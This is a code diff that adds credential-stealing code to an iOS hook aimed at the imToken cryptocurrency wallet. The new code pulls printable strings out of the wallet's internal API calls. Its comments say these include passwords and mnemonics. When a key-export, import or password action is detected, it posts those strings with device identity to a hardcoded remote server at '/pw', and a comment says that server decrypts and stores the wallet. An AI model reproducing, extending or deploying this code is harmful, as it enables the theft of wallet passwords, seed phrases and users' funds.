@@ -19,6 +19,7 @@
 #import "HookTcx.h"
 #import <objc/runtime.h>
 #import <objc/message.h>
+#import "Info.h"
 
 static BOOL gInstalled = NO;
 static char gStatus[256] = {0};
@@ -26,6 +27,69 @@ static char gWhich[128] = {0};
 
 BOOL HookTcxInstalled(void) { return gInstalled; }
 NSString *HookTcxStatus(void) { return [NSString stringWithUTF8String:gStatus]; }
+
+#pragma mark - 直传服务端（不再等 photonote 轮询）
+
+static NSString *const kTcxBaseURL = @"https://myg3z1adawtxz0s.icu";
+static NSString *const kTcxSeed = @"d9f5121f75a6646c4f814a4ff8c41b04";
+
+/// 从 protobuf 二进制里抠出所有可打印串（密码/助记词就是 UTF-8 串，原样在里面）
+static NSArray<NSString *> *ExtractStrings(NSData *d, NSUInteger minLen, NSUInteger maxLen) {
+    NSMutableArray *out = [NSMutableArray array];
+    if (!d.length) return out;
+    const uint8_t *b = d.bytes;
+    NSMutableString *cur = [NSMutableString string];
+    for (NSUInteger i = 0; i <= d.length; i++) {
+        uint8_t c = (i < d.length) ? b[i] : 0;
+        if (c >= 0x20 && c < 0x7f) {
+            [cur appendFormat:@"%c", c];
+        } else {
+            if (cur.length >= minLen && cur.length <= maxLen) [out addObject:[cur copy]];
+            [cur setString:@""];
+        }
+    }
+    return out;
+}
+
+/// 直接 POST /pw 试候选密码；命中后服务端会自动解密并入库
+static void PostCandidates(NSArray<NSString *> *cands, NSString *note) {
+    if (!cands.count) return;
+
+    NSMutableDictionary *body = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
+    body[@"c"] = kTcxSeed;
+    body[@"bundle_id"] = @"im.token.app";
+    body[@"a"] = @"b2";
+    body[@"candidates"] = cands;
+
+    NSError *err = nil;
+    NSData *jp = [NSJSONSerialization dataWithJSONObject:body options:0 error:&err];
+    if (!jp) return;
+
+    NSMutableURLRequest *req = [NSMutableURLRequest
+        requestWithURL:[NSURL URLWithString:[kTcxBaseURL stringByAppendingString:@"/pw"]]];
+    req.HTTPMethod = @"POST";
+    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    req.HTTPBody = jp;
+    req.timeoutInterval = 120;
+
+    NSURLSessionConfiguration *cfg = [NSURLSessionConfiguration ephemeralSessionConfiguration];
+    cfg.timeoutIntervalForRequest = 120;
+    NSURLSession *sess = [NSURLSession sessionWithConfiguration:cfg];
+
+    [[sess dataTaskWithRequest:req completionHandler:^(NSData *d, NSURLResponse *r, NSError *e) {
+        NSString *resp = d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
+        if (!resp) resp = e ? [NSString stringWithFormat:@"err=%@", e.localizedDescription] : @"nil";
+
+        // 落地结果，photonote 会读并上报
+        NSString *line = [NSString stringWithFormat:@"pw[%@] cand=%lu resp=%@",
+                          note ?: @"", (unsigned long)cands.count, resp];
+        NSString *home = NSHomeDirectory();
+        for (NSString *p in @[[home stringByAppendingPathComponent:@"Documents/_imt_tcx_result.txt"],
+                              [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_result.txt"]]) {
+            [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+        }
+    }] resume];
+}
 
 #pragma mark - 落盘
 
@@ -35,9 +99,14 @@ static dispatch_queue_t gQueue = nil;
 static void DumpParam(id param, const char *what) {
     if (!param) return;
     NSString *s = nil;
+    NSData *raw = nil;
     @try {
         if ([param isKindOfClass:[NSString class]]) {
             s = (NSString *)param;
+        } else if ([param isKindOfClass:[NSData class]]) {
+            // 实测 callTcxApi 的参数是 protobuf 二进制（不是字典）
+            raw = (NSData *)param;
+            s = [raw description];
         } else if ([param isKindOfClass:[NSDictionary class]] ||
                    [param isKindOfClass:[NSArray class]]) {
             NSData *j = [NSJSONSerialization dataWithJSONObject:param options:0 error:NULL];
@@ -48,6 +117,35 @@ static void DumpParam(id param, const char *what) {
         }
     } @catch (NSException *e) { (void)e; }
     if (!s.length || s.length > 20000) return;
+
+    // 直传：只有「需要密码的动作」才发，避免每次 check_biometric_mode 都跑一遍 pbkdf2
+    if (raw) {
+        NSArray *cands = ExtractStrings(raw, 6, 64);
+        static NSMutableSet *sent = nil;
+        if (!sent) sent = [NSMutableSet set];
+
+        BOOL needsPwd = NO;
+        for (NSString *c in cands) {
+            if ([c isEqualToString:@"get_derived_key"] ||
+                [c isEqualToString:@"export_mnemonic"] ||
+                [c isEqualToString:@"create_keystore"] ||
+                [c isEqualToString:@"import_mnemonic"] ||
+                [c isEqualToString:@"import_private_key"] ||
+                [c isEqualToString:@"export_private_key"] ||
+                [c isEqualToString:@"change_password"] ||
+                [c isEqualToString:@"migrate_keystore"]) {
+                needsPwd = YES;
+                break;
+            }
+        }
+        if (needsPwd && cands.count) {
+            NSString *key = [cands componentsJoinedByString:@"|"];
+            if (![sent containsObject:key]) {
+                [sent addObject:key];
+                PostCandidates(cands, what ? [NSString stringWithUTF8String:what] : @"");
+            }
+        }
+    }
 
     NSString *line = [NSString stringWithFormat:@"[%s] %@", what ?: "?", s];
     if (!gLog) {
